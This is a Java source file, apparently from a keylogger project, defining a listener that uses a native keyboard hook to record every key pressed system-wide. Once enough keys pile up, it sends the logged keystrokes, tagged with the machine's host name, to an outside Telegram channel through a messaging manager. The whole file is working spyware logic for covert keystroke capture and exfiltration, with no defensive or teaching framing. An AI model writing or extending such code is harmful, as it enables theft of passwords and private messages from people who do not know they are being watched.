package com.schnarre.keylogger.listener;

import com.schnarre.keylogger.KeyLogger;
import lombok.Getter;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.PrintStream;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.List;

/**
 * Created by IntelliJ IDEA
 * User: schnarrenils
 * Date: 04.01.2023
 * Time: 00:42
 */

public class KeyListener implements NativeKeyListener {
    private static int counter = KeyLogger.getCounter();
    private List<String> keys = KeyLogger.getLoggedKeys();

    /**
     * Taste getippt
     * @param nativeKeyEvent
     */
    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }

    /**
     * Taste gedrückt
     * @param nativeKeyEvent
     */
    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        String key = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
        keys.add(key);
        counter++;

        if (nativeKeyEvent.getKeyCode() == NativeKeyEvent.VC_ENTER && counter >= 250 || counter >= 1000) {
            String message = keys.toString();
            try {
                KeyLogger.getTelegramManager().sendMessage(InetAddress.getLocalHost() + " - " + message);
            } catch (UnknownHostException e) {
                throw new RuntimeException(e);
            }
            counter = 0;
            keys.clear();
        }

        if (nativeKeyEvent.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            KeyLogger.shutdown();
        }
    }

    /**
     * Taste losgelassen
     * @param nativeKeyEvent
     */
    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }

}
